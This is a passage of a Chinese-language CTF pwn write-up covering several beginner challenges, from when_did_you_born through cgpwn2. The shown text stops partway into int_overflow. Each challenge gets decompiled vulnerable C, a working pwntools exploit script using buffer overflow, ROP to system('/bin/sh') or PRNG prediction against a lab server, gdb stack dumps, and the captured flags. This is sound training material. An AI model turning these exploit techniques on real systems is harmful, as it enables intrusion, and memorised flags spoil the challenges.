class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">7</span>a11a088e83dfd9525a7f575eb43bbe4&#125;<br></code></pre></td></tr></table></figure><h3 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [rsp+0h] [rbp-20h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s Your Birth?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>  <span class="hljs-keyword">while</span> ( getchar() != <span class="hljs-number">10</span> )<br>    ;<br>  <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">1926</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Cannot Born In 1926!&quot;</span>);<br>    result = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s Your Name?&quot;</span>);<br>    gets(&amp;v4);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You Are Born In %d\n&quot;</span>, v5);<br>    <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">1926</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Shall Have Flag.&quot;</span>);<br>      system(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Are Naive.&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Speed One Second Here.&quot;</span>);<br>    &#125;<br>    result = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>溢出，脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">34190</span>)<br>age = p64(<span class="hljs-number">1926</span>)<br> <br>io.recvuntil(<span class="hljs-string">&#x27;What\&#x27;s Your Birth?\n&#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.recvuntil(<span class="hljs-string">&#x27;What\&#x27;s Your Name?\n&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">8</span> + age)<br><span class="hljs-built_in">print</span>(io.recv())<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">480</span>d5559a5da195d0d304031d1ca79ad&#125;<br></code></pre></td></tr></table></figure><h3 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  alarm(<span class="hljs-number">0x3C</span>u);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;~~ welcome to ctf ~~     &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;lets get helloworld for bof&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;unk_601068, <span class="hljs-number">0x10</span>uLL);<br>  <span class="hljs-keyword">if</span> ( dword_60106C == <span class="hljs-string">&#x27;nuaa&#x27;</span> )<br>    sub_400686(<span class="hljs-number">0LL</span>, &amp;unk_601068);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>溢出，脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">41373</span>)<br><br>nuaa = p32(<span class="hljs-number">0x6E756161</span>)<br> <br>io.recvuntil(<span class="hljs-string">&#x27;lets get helloworld for bof\n&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">4</span> + nuaa)<br><span class="hljs-built_in">print</span>(io.recv())<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">907</span>d57b451589b80d32b742492ffc357&#125;<br></code></pre></td></tr></table></figure><h3 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-80h]</span><br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">512uLL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">39085</span>)<br><br>eip = p64(<span class="hljs-number">0x400596</span>)<br>payload = <span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">128</span> + <span class="hljs-number">8</span>) + eip<br> <br>io.recvuntil(<span class="hljs-string">&#x27;World\n&#x27;</span>)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">0</span>a5428dc9d0fc7b09735439513d590f0&#125;<br></code></pre></td></tr></table></figure><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>ROP利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [esp+0h] [ebp-88h]</span><br><br>  system(<span class="hljs-string">&quot;echo Input:&quot;</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><p>题目中system与bin&#x2F;sh都已经准备好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">57085</span>)<br><br>bin_sh = p32(<span class="hljs-number">0x0804A024</span>)<br>sys_addr = p32(<span class="hljs-number">0x08048320</span>)<br>payload = <span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">0x88</span> + <span class="hljs-number">4</span>) + sys_addr + <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">4</span> + bin_sh<br> <br>io.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cyberpeace</span><span class="hljs-template-variable">&#123;e626f78a0fd99bf06f22535c5a1eb7d2&#125;</span><br></code></pre></td></tr></table></figure><h3 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h3><p>考察溢出、伪随机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">59754</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./guess&#x27;</span>)<br><span class="hljs-built_in">print</span>(elf.libc)<br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Your name:&#x27;</span>)<br>io.sendline(payload)<br>libc.srand(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    num = <span class="hljs-built_in">str</span>(libc.rand()%<span class="hljs-number">6</span>+<span class="hljs-number">1</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;number:&#x27;</span>)<br>    io.sendline(num)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cyberpeace</span><span class="hljs-template-variable">&#123;a6baa716374124aa6541575346d33ebf&#125;</span><br></code></pre></td></tr></table></figure><h3 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h3><p>rop</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">55082</span>)<br><br>system_addr = <span class="hljs-number">0x0804855A</span><br>bin_sh_addr = <span class="hljs-number">0x0804A080</span><br><br>payload = <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">0x26</span> + <span class="hljs-number">4</span>) + p32(system_addr) + p32(bin_sh_addr)<br>io.recvuntil(<span class="hljs-string">&#x27;name&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;here:&#x27;</span>)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cyberpeace</span><span class="hljs-template-variable">&#123;f27da510570ddc37586e1c3a6ff92d22&#125;</span><br></code></pre></td></tr></table></figure><p>这里记录一下构造栈帧的点，system的地址可以用以下两个：</p><ul><li>第一种</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">.plt:08048420                 jmp     ds:off_804A01C<br>.plt:08048420 _system         endp<br></code></pre></td></tr></table></figure><p>对应的payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-comment">(0x26 + 4)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(system_addr)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(0)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(bin_sh_addr)</span><br></code></pre></td></tr></table></figure><p>对应栈帧分布：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">[----------------------------------registers-----------------------------------]<br><span class="hljs-symbol">EAX:</span> <span class="hljs-number">0x56559000</span> --&gt; <span class="hljs-number">0x3efc</span> <br><span class="hljs-symbol">EBX:</span> <span class="hljs-number">0x56559000</span> --&gt; <span class="hljs-number">0x3efc</span> <br><span class="hljs-symbol">ECX:</span> <span class="hljs-number">0xffffd310</span> --&gt; <span class="hljs-number">0x1</span> <br><span class="hljs-symbol">EDX:</span> <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-symbol">ESI:</span> <span class="hljs-number">0xf7fa4000</span> --&gt; <span class="hljs-number">0x1d5d8c</span> <br><span class="hljs-symbol">EDI:</span> <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">EBP:</span> <span class="hljs-number">0xffffd2f8</span> --&gt; <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">ESP:</span> <span class="hljs-number">0xffffd2dc</span> --&gt; <span class="hljs-number">0x565561d3</span> (&lt;main+<span class="hljs-number">42</span>&gt;:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span>)<br><span class="hljs-symbol">EIP:</span> <span class="hljs-number">0x56556046</span> (&lt;system@plt+<span class="hljs-number">6</span>&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-number">0x0</span>)<br><span class="hljs-symbol">EFLAGS:</span> <span class="hljs-number">0x296</span> (carry PARITY ADJUST <span class="hljs-meta">zero</span> SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   <span class="hljs-number">0x5655603c</span>:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">eax</span>],<span class="hljs-built_in">al</span><br>   <span class="hljs-number">0x5655603e</span>:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">eax</span>],<span class="hljs-built_in">al</span><br>   <span class="hljs-number">0x56556040</span> &lt;system@plt&gt;:<span class="hljs-keyword">jmp</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebx</span>+<span class="hljs-number">0xc</span>]<br>=&gt; <span class="hljs-number">0x56556046</span> &lt;system@plt+<span class="hljs-number">6</span>&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x5655604b</span> &lt;system@plt+<span class="hljs-number">11</span>&gt;:<span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x56556030</span><br>   <span class="hljs-number">0x56556050</span> &lt;__libc_start_main@plt&gt;:<span class="hljs-keyword">jmp</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebx</span>+<span class="hljs-number">0x10</span>]<br>   <span class="hljs-number">0x56556056</span> &lt;__libc_start_main@plt+<span class="hljs-number">6</span>&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-number">0x8</span><br>   <span class="hljs-number">0x5655605b</span> &lt;__libc_start_main@plt+<span class="hljs-number">11</span>&gt;:<span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x56556030</span><br>[------------------------------------stack-------------------------------------]<br><span class="hljs-number">0000</span>| <span class="hljs-number">0xffffd2dc</span> --&gt; <span class="hljs-number">0x565561d3</span> (&lt;main+<span class="hljs-number">42</span>&gt;:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span>)<br><span class="hljs-number">0004</span>| <span class="hljs-number">0xffffd2e0</span> --&gt; <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-number">0008</span>| <span class="hljs-number">0xffffd2e4</span> --&gt; <span class="hljs-number">0xffffd3a4</span> --&gt; <span class="hljs-number">0xffffd540</span> (<span class="hljs-string">&quot;/root/a.out&quot;</span>)<br><span class="hljs-number">0012</span>| <span class="hljs-number">0xffffd2e8</span> --&gt; <span class="hljs-number">0xffffd3ac</span> --&gt; <span class="hljs-number">0xffffd54c</span> (<span class="hljs-string">&quot;LANG=zh_CN.UTF-8&quot;</span>)<br><span class="hljs-number">0016</span>| <span class="hljs-number">0xffffd2ec</span> --&gt; <span class="hljs-number">0x565561bd</span> (&lt;main+<span class="hljs-number">20</span>&gt;:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x2e43</span>)<br><span class="hljs-number">0020</span>| <span class="hljs-number">0xffffd2f0</span> --&gt; <span class="hljs-number">0xffffd310</span> --&gt; <span class="hljs-number">0x1</span> <br><span class="hljs-number">0024</span>| <span class="hljs-number">0xffffd2f4</span> --&gt; <span class="hljs-number">0x0</span> <br><span class="hljs-number">0028</span>| <span class="hljs-number">0xffffd2f8</span> --&gt; <span class="hljs-number">0x0</span> <br>[------------------------------------------------------------------------------]<br></code></pre></td></tr></table></figure><ul><li>第二种</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:08048553                 mov     dword ptr [esp], offset command ; &quot;echo hehehe&quot;<br>.text:0804855A                 call    _system<br>.text:0804855F                 nop<br></code></pre></td></tr></table></figure><p>对应的payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-comment">(0x26 + 4)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(system_addr)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(bin_sh_addr)</span><br></code></pre></td></tr></table></figure><p>对应栈帧分布情况：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">[----------------------------------registers-----------------------------------]<br><span class="hljs-symbol">EAX:</span> <span class="hljs-number">0x56559000</span> --&gt; <span class="hljs-number">0x3efc</span> <br><span class="hljs-symbol">EBX:</span> <span class="hljs-number">0x56559000</span> --&gt; <span class="hljs-number">0x3efc</span> <br><span class="hljs-symbol">ECX:</span> <span class="hljs-number">0xffffd310</span> --&gt; <span class="hljs-number">0x1</span> <br><span class="hljs-symbol">EDX:</span> <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-symbol">ESI:</span> <span class="hljs-number">0xf7fa4000</span> --&gt; <span class="hljs-number">0x1d5d8c</span> <br><span class="hljs-symbol">EDI:</span> <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">EBP:</span> <span class="hljs-number">0xffffd2f8</span> --&gt; <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">ESP:</span> <span class="hljs-number">0xffffd2e0</span> --&gt; <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-symbol">EIP:</span> <span class="hljs-number">0x565561ce</span> (&lt;main+<span class="hljs-number">37</span>&gt;:<span class="hljs-keyword">call</span>   <span class="hljs-number">0x56556040</span> &lt;system@plt&gt;)<br><span class="hljs-symbol">EFLAGS:</span> <span class="hljs-number">0x296</span> (carry PARITY ADJUST <span class="hljs-meta">zero</span> SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   <span class="hljs-number">0x565561c5</span> &lt;main+<span class="hljs-number">28</span>&gt;:<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">edx</span>,[<span class="hljs-built_in">eax</span>-<span class="hljs-number">0x1ff8</span>]<br>   <span class="hljs-number">0x565561cb</span> &lt;main+<span class="hljs-number">34</span>&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-built_in">edx</span><br>   <span class="hljs-number">0x565561cc</span> &lt;main+<span class="hljs-number">35</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">eax</span><br>=&gt; <span class="hljs-number">0x565561ce</span> &lt;main+<span class="hljs-number">37</span>&gt;:<span class="hljs-keyword">call</span>   <span class="hljs-number">0x56556040</span> &lt;system@plt&gt;<br>   <span class="hljs-number">0x565561d3</span> &lt;main+<span class="hljs-number">42</span>&gt;:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span><br>   <span class="hljs-number">0x565561d6</span> &lt;main+<span class="hljs-number">45</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x565561db</span> &lt;main+<span class="hljs-number">50</span>&gt;:<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">esp</span>,[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8</span>]<br>   <span class="hljs-number">0x565561de</span> &lt;main+<span class="hljs-number">53</span>&gt;:<span class="hljs-keyword">pop</span>    <span class="hljs-built_in">ecx</span><br>Guessed arguments:<br>arg[<span class="hljs-number">0</span>]: <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>[------------------------------------stack-------------------------------------]<br><span class="hljs-number">0000</span>| <span class="hljs-number">0xffffd2e0</span> --&gt; <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-number">0004</span>| <span class="hljs-number">0xffffd2e4</span> --&gt; <span class="hljs-number">0xffffd3a4</span> --&gt; <span class="hljs-number">0xffffd540</span> (<span class="hljs-string">&quot;/root/a.out&quot;</span>)<br><span class="hljs-number">0008</span>| <span class="hljs-number">0xffffd2e8</span> --&gt; <span class="hljs-number">0xffffd3ac</span> --&gt; <span class="hljs-number">0xffffd54c</span> (<span class="hljs-string">&quot;LANG=zh_CN.UTF-8&quot;</span>)<br><span class="hljs-number">0012</span>| <span class="hljs-number">0xffffd2ec</span> --&gt; <span class="hljs-number">0x565561bd</span> (&lt;main+<span class="hljs-number">20</span>&gt;:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x2e43</span>)<br><span class="hljs-number">0016</span>| <span class="hljs-number">0xffffd2f0</span> --&gt; <span class="hljs-number">0xffffd310</span> --&gt; <span class="hljs-number">0x1</span> <br><span class="hljs-number">0020</span>| <span class="hljs-number">0xffffd2f4</span> --&gt; <span class="hljs-number">0x0</span> <br><span class="hljs-number">0024</span>| <span class="hljs-number">0xffffd2f8</span> --&gt; <span class="hljs-number">0x0</span> <br><span class="hljs-number">0028</span>| <span class="hljs-number">0xffffd2fc</span> --&gt; <span class="hljs-number">0xf7de79a1</span> (&lt;__libc_start_main+<span class="hljs-number">241</span>&gt;:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span>)<br>[------------------------------------------------------------------------------]<br></code></pre></td></tr></table></figure><p>总的来说就是两个system处于不同的函数栈帧中，所以一个payload需要多构造4个字节的padding来填充system返回地址，而另一个不需要。</p><h3 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h3><p>整数溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, 